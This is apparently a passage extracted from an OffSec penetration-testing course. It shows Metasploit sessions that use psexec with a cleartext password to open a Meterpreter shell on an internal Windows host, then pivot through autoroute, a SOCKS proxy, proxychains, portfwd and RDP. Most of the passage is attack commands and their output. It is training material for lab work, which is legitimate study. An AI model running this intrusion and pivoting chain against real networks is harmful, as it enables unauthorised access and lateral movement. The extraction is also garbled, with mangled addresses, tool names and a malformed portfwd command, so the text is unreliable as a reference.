
# OffSec Penetration Testing with Kali Linux

```
msf6 exploit(windows/smb/psexec) > set SMBPass "BoccieDearAeroMeow!"
SMBPass => BoccieDearAeroMeow!

msf6 exploit(windows/smb/psexec) > set RHOSTS 172.16.5.200
RHOSTS => 172.16.5.200

msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp

msf6 exploit(windows/smb/psexec) > set LPORT 8000
LPORT => 8000
```

Listing 694 - Setting options for the psexec module

```
msf6 exploit(windows/smb/psexec) > run

[*] 172.16.5.200:445 - Connecting to the server...
[*] 172.16.5.200:445 - Authenticating to 172.16.5.200:445|ITW02 as user 'luiza'...
[*] 172.16.5.200:445 - Selecting PowerShell target
[*] 172.16.5.200:445 - Executing the payload...
[*] 172.16.5.200:445 - Start service timed out, OK by running a command or non-service executable.
[*] Started TCP handler on 172.16.5.200:8000
[*] Sending stage (20074 bytes) to 172.16.5.200
[*] Meterpreter session 13 opened (172.16.5.199:51785 -> 172.16.5.200:8000) via session
 2022-08-05 07:06:43 -0400
```

Now all options are set, we launch the module.

Listing 695 - Launching the psexec module

```
meterpreter>
```

Listing 695 shows that we successfully used the psexec exploit to obtain a Meterpreter shell on the second target via the compromised machine.

As an alternative to adding routes, we can use the autoroute post-exploitation module to set pivot routes through an existing Meterpreter session. To demonstrate the usage of this module, we first need to remove the route we set manually. Let's terminate the Meterpreter session created through the psexec module and remove all routes with route flush.

Now the only session is the Meterpreter session created by executing met as user luiza. The result of route print shows that there are no routes defined. Next, let's activate the module/manage/autoroute in which we have to set the session ID as the option SESSION. Then, let's run to launch the module.

```
msf6 exploit(windows/smb/psexec) > use multi/manage/autoroute
msf6 post(multi/manage/autoroute) > show options
```

Module options (post/manage/autoroute):

| Name | Setting Required Description |
|---|---|---|
| CMD | autoadd yes | Specify the autoroute command (add, print, delete, default) NETMASK 255.255.255.0 no | Netmask (IPv4 as "255.255.255.0" or CIDR as "/24") |

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

# OffSec Penetration Testing with Kali Linux

SESSION yes The session to run this module on
SUBET no Subnet (IPv4, for example, 10.10.10.0)

```
msf6 post(multi/manage/autoute) > sessions -l
```

Active sessions ==========

Id Name Type Information Connection
12 127.0.0.1 () meterpreter x86/64 ITWK01~luiza @ ITWK01 192.168.119.443 ->

```
msf6 post(multi/manage/autoute) > set session 12
session => 12
```

```
msf6 post(multi/manage/autoute) > run
```

+   [] SESSION may not be compatible with this module:
[*] * Incompatible session platform: windows
[*] Running module against ITWK01
[*] Searching for autoroute.
[*] Route added to 172.16.50.0/255.255.255 from host's routing table.
[*] Route added to 192.168.50.0/255.255.255 from host's routing table.
[*] Post module execution completed

> Listing 696 Invoking the autoroute module

Listing 696 shows autoroute as we did before, but we can also combine routes with the server/socks_proxy module to configure a SOCKS102 proxy. This allows applications outside of the Metasploit Framework to tunnel through the pivot on port 1080 by we set the option SRVHOST 127.0.1 and VERSION 5 in order to use SOCKS 5.

```
msf6 post(multi/manage/autoute) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > show options
```

Module options (auxiliary/server/socks_proxy):

| Name | Setting Required Description |
|---|---|---|
| PASSWORD no | password for SOCKS listener |
| SRVHOST 0.0.0.0 yes | The local or network interface to listen on. This must be set on the local machine or 0.0.0.0 to listen on all addresses. |
| SRVPORT 1080 yes | The port to listen on |
| USERNAME no | username for SOCKS listener |
| VERSION 5 no | The version to use (Accepted: 4,5) |

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

# OffSec Penetration Testing with Kali Linux

| Name | Description |
| --- | --- |
| Proxy | Run a SOCKS server |

```
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.1
SRVHOST => 127.0.1
msf6 auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5
msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background 0.
[*] Starting the SOCKS server
```

Listing 697 - Setting up SOCKS proxy using the autoroute module

We can now update our proxies configuration file (/etc/proxychains.conf) to take advantage of the SOCKS proxy. After editing the configuration file, it should appear like:

```
kali@kali~$ tail /etc/proxychains.conf
# proxy types: http, socks4, socks5, raw
# raw: The traffic is simply forwarded to the proxy without modification.
# auth types supported: "http-user/pass" 
# add proxy here ...
# defaults to "tor"
socks5 127.0.1 1080
```

Listing 698 - Updated proxychains configuration

Finally, we can use proxies through xfreerd to access GUI from our Kali system to the target on the internal network.

```
kali@kali~$ sudo proxychains xfreerd /v:172.16.5.200 /luiza
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so
[proxychains] init chain 127.0.0.1:1080 172.16.5.200:3389 ... OK
```

Certificate details for 172.16.5.200 (RDP-Server):
Common Name: itwk02
Subject: CN = itwk02
Issuer: CN = itwk02
Thumbprint: 4b:ef:ec:bb:96:7d:01:53:f3:03:de:89:51:a9:b3:1f:b2:70:83:fc:7a:9a:ec:eb:7
The above self-signed certificate could not be verified, possibly because you do not have the CA certificate in your certificate store, or the certificate has expired. Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/N) Y
Password:
...

Listing 699 - Gaining remote access inside the internal network

# OffSec Penetration Testing with Kali Linux

The freerdp client opens a new window providing us access to the GUI of ITWK02 in the internal network via RDP.

![](img/336d6ea891e7464f18ad64426619ced4_682_0.png)

Figure 266: Remote desktop access from Kali Linux to internal network

Nice! Figure 266 shows that we successfully connected to the second target via RDP by pivoting. We can also use a similar technique for port forwarding using the portfwd command from inside a Meterpreter session, which will forward a specific port to the internal network.

```
msf6 auxiliary(server/socks/proxy) > sessions -i 12
[*] Starting interaction with 5...
```

```
meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]
```

+   -h Help banner.
-i Index of the port forward to interact with (see the "list" command).
-l Forward: local port to listen on. Reverse: local port to connect to.
-L Forward: local host to listen on (optional). Reverse: local host to connect.
-p Forward: remote port to connect to. Reverse: remote port to listen on.

Listing 700 - Options available for portwd

We can create a port forward from localhost 3389 to 172.16.5.200 as shown in 701.

# OffSec Penetration Testing with Kali Linux

```
meterpreter > portfwd add -l 3389 -p 172.16.5.200
```

Listing 701 - Port forwarding over portwd

Now we can use proxychains xfreerd to access GUI on the internal network.

```
kali@kali~$ sudo proxychains xfreerd 127.0.0.1:3389
```
